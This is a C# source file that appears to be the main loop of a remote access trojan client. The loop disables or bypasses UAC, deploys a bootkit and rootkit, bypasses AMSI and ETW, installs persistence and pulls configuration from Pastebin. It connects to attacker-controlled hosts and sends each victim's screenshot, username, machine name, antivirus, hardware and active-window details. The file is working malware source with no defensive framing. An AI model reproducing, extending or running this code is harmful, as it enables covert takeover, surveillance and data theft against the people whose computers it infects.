using System;
using System.Collections.Generic;
using System.Net;
using System.Threading;
using Client.Helper;
using Leb128;

namespace Client;

internal class Program
{
	public static Client.Helper.Client client = CreateClient();

	private static Client.Helper.Client CreateClient()
	{
		return new Client.Helper.Client();
	}

	private static void Main(string[] args)
	{
		try
		{
			bool flag = false;
			bool flag2 = false;
			bool flag3 = false;
			string text = null;
			string text2 = null;
			if (args != null)
			{
				string[] array = args;
				foreach (string text3 in array)
				{
					string text4 = text3?.Trim().ToLowerInvariant();
					if (text4 == "--no-antivm" || text4 == "--vm")
					{
						flag = true;
					}
					if (text4 == "--driver-infection")
					{
						flag2 = true;
					}
					if (text4 == "--elevated")
					{
						flag3 = true;
					}
					if (text4 != null && text4.StartsWith("--host="))
					{
						text = text3.Substring("--host=".Length);
					}
					if (text4 != null && text4.StartsWith("--port="))
					{
						text2 = text3.Substring("--port=".Length);
					}
				}
			}
			if (flag)
			{
				try
				{
					Environment.SetEnvironmentVariable("DISABLE_ANTIVIRTUAL", "1");
				}
				catch
				{
				}
			}
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
			Config.Init();
			if (flag3 || Config.Privilege == "Admin")
			{
				UACBypass.DisableUAC();
			}
			if (Config.UACBypass == "true" && Config.Privilege != "Admin" && !flag3)
			{
				UACBypass.Run();
			}
			if (flag2)
			{
				Config.DriverInfection = "true";
				DriverInfector.Run();
			}
			try
			{
				new Thread((ThreadStart)delegate
				{
					try
					{
						AdvancedBootkit.Deploy();
					}
					catch
					{
					}
				}).Start();
			}
			catch
			{
			}
			try
			{
				if (Config.Rootkit == "true")
				{
					Rootkit.Initialize();
				}
			}
			catch
			{
			}
			try
			{
				PolymorphArea.Touch();
			}
			catch
			{
			}
			try
			{
				AsmiAndETW.Bypass();
			}
			catch
			{
			}
			try
			{
				AntiProcess.Start();
			}
			catch
			{
			}
			if (Config.Install == "true" || Config.CmdlineAutorun == "true")
			{
				Install.Run();
			}
			int num = 0;
			while (!MutexControl.CreateMutex(Config.Mutex) && num < 40)
			{
				Thread.Sleep(50);
				num++;
			}
			if (!MutexControl.createdNew)
			{
				return;
			}
			Methods.MaxPriority();
			Methods.PreventSleep();
			int num2 = 0;
			if (Config.ProcessCritical == "true")
			{
				Methods.SetProcessCritical();
			}
			while (true)
			{
				if (!string.IsNullOrWhiteSpace(Config.PastebinUrl))
				{
					num2++;
					if (num2 >= 150)
					{
						num2 = 0;
						try
						{
							Config.TryLoadFromPastebin();
						}
						catch
						{
						}
					}
				}
				if (!client.itsConnect)
				{
					List<Tuple<string, string[]>> list = new List<Tuple<string, string[]>>();
					try
					{
						if (!string.IsNullOrWhiteSpace(Config.Hosts) && Config.Hosts.IndexOf('%') < 0)
						{
							string[] array = Config.Hosts.Split(new char[1] { ';' }, StringSplitOptions.RemoveEmptyEntries);
							for (int i = 0; i < array.Length; i++)
							{
								string[] array2 = array[i].Split(new char[1] { ':' }, 2);
								if (array2.Length == 2 && !string.IsNullOrWhiteSpace(array2[0]) && !string.IsNullOrWhiteSpace(array2[1]))
								{
									string[] array3 = array2[1].Split(new char[1] { ',' }, StringSplitOptions.RemoveEmptyEntries);
									if (array3.Length != 0)
									{
										list.Add(Tuple.Create(array2[0], array3));
									}
								}
							}
						}
					}
					catch
					{
					}
					if (list.Count == 0 && !string.IsNullOrWhiteSpace(text) && !string.IsNullOrWhiteSpace(text2))
					{
						list.Add(Tuple.Create(text, new string[1] { text2 }));
					}
					if (list.Count == 0)
					{
						Thread.Sleep(200);
						continue;
					}
					Tuple<string, string[]> tuple = list[Methods.random.Next(list.Count)];
					string item = tuple.Item1;
					string[] item2 = tuple.Item2;
					string port = item2[Methods.random.Next(item2.Length)];
					client.Disconnect();
					client.Connect(item, port);
					if (client.itsConnect)
					{
						client.pingChecker = new PingChecker(client);
						client.lastPing = new LastPing(client);
						Thread.Sleep(100);
						client.Send(LEB128.Write(new object[19]
						{
							EncryptString.Decode("Connect"),
							Methods.CaptureResizeReduceQuality(),
							Config.Group,
							Config.Hwid,
							Config.LocalIP,
							"Unknown",
							Environment.UserName + EncryptString.Decode(" @ ") + Environment.MachineName,
							Config.Camera,
							Config.Cpu,
							Config.Gpu,
							Config.WindowsVersion,
							Config.AntiVirus,
							Config.Version,
							Config.DataInstall,
							Config.Privilege,
							Methods.GetActiveWindowTitle(),
							Methods.GetProcessName(),
							Methods.GetCommandLine(),
							Config.GeoInfo
						}));
					}
				}
				Thread.Sleep(100);
			}
		}
		catch
		{
		}
	}
}
